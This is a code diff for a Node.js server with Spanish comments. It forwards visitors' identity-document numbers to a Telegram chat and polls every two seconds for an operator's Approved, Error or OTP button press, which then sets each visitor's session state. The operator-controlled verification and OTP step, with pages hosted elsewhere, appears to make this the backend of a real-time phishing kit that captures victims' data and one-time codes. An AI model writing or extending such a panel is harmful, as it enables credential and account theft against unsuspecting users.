@@ -29,7 +29,7 @@ function telegramConfigurado() {
   return Boolean(BOT_TOKEN && CHAT_ID);
 }
 
-async function enviarATelegram(mensaje) {
+async function enviarATelegram(mensaje, botones = null) {
   if (!telegramConfigurado()) {
     return {
       success: false,
@@ -39,14 +39,24 @@ async function enviarATelegram(mensaje) {
   }
 
   const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+
+  const payload = {
+    chat_id: CHAT_ID,
+    text: mensaje,
+    parse_mode: 'HTML'
+  };
+
+  // Agregar botones si existen
+  if (botones && botones.length > 0) {
+    payload.reply_markup = {
+      inline_keyboard: botones
+    };
+  }
+
   const response = await fetch(url, {
     method: 'POST',
     headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({
-      chat_id: CHAT_ID,
-      text: mensaje,
-      parse_mode: 'HTML'
-    })
+    body: JSON.stringify(payload)
   });
 
   const data = await response.json();
@@ -163,7 +173,7 @@ app.post('/api/guardar-verificacion', async (req, res) => {
   console.log(`📝 Nueva sesión creada: ${session_id}`);
   console.log(`   Documento: ${numero_documento} (${tipo_documento})`);
 
-  // Enviar a Telegram con botones
+  // Enviar a Telegram con botones interactivos
   const mensajeTelegram = [
     `🔐 <b>NUEVO USUARIO - VERIFICACIÓN PENDIENTE</b>`,
     ``,
@@ -173,14 +183,20 @@ app.post('/api/guardar-verificacion', async (req, res) => {
     `• Recordar: ${recordar ? 'Sí ✓' : 'No'}`,
     ``,
     `<b>Session ID:</b> <code>${session_id}</code>`,
-    `<b>Hora:</b> ${new Date().toLocaleString('es-CO')}`,
-    ``,
-    `<b>ACCIONES:</b>`,
-    `[Aprobado ✓] [Error ✗] [OTP 📱]`
+    `<b>Hora:</b> ${new Date().toLocaleString('es-CO')}`
   ].join('\n');
 
+  // Botones interactivos de Telegram
+  const botonesInteractivos = [
+    [
+      { text: 'Aprobado ✓', callback_data: `accion_aprobado_${session_id}` },
+      { text: 'Error ✗', callback_data: `accion_error_${session_id}` },
+      { text: 'OTP 📱', callback_data: `accion_otp_${session_id}` }
+    ]
+  ];
+
   try {
-    const envio = await enviarATelegram(mensajeTelegram);
+    const envio = await enviarATelegram(mensajeTelegram, botonesInteractivos);
     res.json({
       success: true,
       session_id,
@@ -353,6 +369,139 @@ app.post('/api/telegram/accion', async (req, res) => {
   }
 });
 
+// ===== POLLING DE TELEGRAM =====
+// Consultar actualizaciones de Telegram sin necesidad de webhook
+let lastUpdateId = 0;
+
+async function pollingTelegram() {
+  if (!telegramConfigurado()) return;
+
+  try {
+    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        offset: lastUpdateId + 1,
+        timeout: 0
+      })
+    });
+
+    const data = await response.json();
+
+    if (!data.ok) {
+      console.error('⚠️ Error en getUpdates:', data.description);
+      return;
+    }
+
+    if (data.result && data.result.length > 0) {
+      console.log(`📬 ${data.result.length} update(s) de Telegram`);
+
+      for (const update of data.result) {
+        lastUpdateId = update.update_id;
+
+        // Procesar callback_query (cuando se presiona un botón)
+        if (update.callback_query) {
+          const { id: callback_query_id, data: callbackData, from, message } = update.callback_query;
+
+          console.log(`📱 Botón presionado:`, { callbackData, usuario: from.username || from.first_name });
+
+          // Parsear callback_data: formato "accion_ACCION_SESSION_ID"
+          const partes = callbackData.split('_');
+          if (partes[0] === 'accion' && partes.length >= 3) {
+            const accion = partes[1]; // aprobado, error, otp
+            const session_id = partes.slice(2).join('_');
+
+            console.log(`🎯 Procesando acción: ${accion} para sesión: ${session_id}`);
+
+            // Actualizar sesión si existe
+            if (sesiones.has(session_id)) {
+              const sesion = sesiones.get(session_id);
+
+              // Mapear acción a estado
+              const estadoMap = {
+                'aprobado': 'aprobado',
+                'error': 'error',
+                'otp': 'otp'
+              };
+
+              sesion.estado = estadoMap[accion] || accion;
+              sesion.timestamp_respuesta = Date.now();
+              sesion.respuesta_telegram = {
+                accion,
+                usuario_id: from.id,
+                usuario: from.username || from.first_name,
+                timestamp: new Date().toISOString()
+              };
+
+              console.log(`✅ Sesión ${session_id} actualizada → estado: ${sesion.estado}`);
+
+              // Editar mensaje de Telegram para eliminar botones
+              const mensajeEditado = [
+                `🔐 <b>NUEVO USUARIO - VERIFICACIÓN PENDIENTE</b>`,
+                ``,
+                `<b>Datos:</b>`,
+                `• Documento: <code>${sesion.datos.numero_documento}</code>`,
+                `• Tipo: <b>${sesion.datos.tipo_documento}</b>`,
+                `• Recordar: ${sesion.datos.recordar ? 'Sí ✓' : 'No'}`,
+                ``,
+                `<b>Session ID:</b> <code>${session_id}</code>`,
+                `<b>Respuesta:</b> <b>${accion.toUpperCase()} ✓</b>`,
+                `<b>Usuario:</b> ${from.username || from.first_name}`,
+                `<b>Hora:</b> ${new Date().toLocaleString('es-CO')}`
+              ].join('\n');
+
+              // Editar mensaje en Telegram (sin botones)
+              try {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/editMessageText`, {
+                  method: 'POST',
+                  headers: { 'Content-Type': 'application/json' },
+                  body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    message_id: message.message_id,
+                    text: mensajeEditado,
+                    parse_mode: 'HTML',
+                    reply_markup: { inline_keyboard: [] }
+                  })
+                });
+
+                console.log(`✏️ Mensaje editado - botones removidos`);
+              } catch (error) {
+                console.error('⚠️ Error editando mensaje:', error.message);
+              }
+
+              // Responder a Telegram (quitar loading/notificación)
+              await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                  callback_query_id,
+                  text: `✅ ${accion.charAt(0).toUpperCase() + accion.slice(1)} registrado`
+                })
+              });
+            } else {
+              console.warn(`⚠️ Sesión ${session_id} no encontrada`);
+
+              await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                  callback_query_id,
+                  text: '❌ Sesión expirada'
+                })
+              });
+            }
+          }
+        }
+      }
+    }
+  } catch (error) {
+    console.error('❌ Error en polling de Telegram:', error.message);
+  }
+}
+
+// Polling cada 2 segundos
+setInterval(pollingTelegram, 2000);
+
 // ===== RUTAS ESTÁTICAS =====
 // Nota: Los archivos HTML están en Azure Blob Storage, no en Render
 // Por eso no servimos index.html localmente
@@ -386,6 +535,9 @@ app.listen(PORT, '0.0.0.0', () => {
   console.log('\n📝 Rutas disponibles:');
   console.log('   GET  /health - Verificar estado del servidor');
   console.log('   GET  /api/estado - Obtener estado actual');
+  console.log('   POST /api/guardar-verificacion - Crear sesión y enviar a Telegram');
+  console.log('   GET  /api/consultar-estado - Consultar estado de sesión');
   console.log('   POST /api/validate - Validar datos');
-  console.log('   POST /api/telegram/accion - Recibir acciones de Telegram');
+  console.log('\n🤖 Polling de Telegram activo (cada 2 segundos)');
+  console.log('   Detecta botones presionados: Aprobado ✓, Error ✗, OTP 📱');
 });
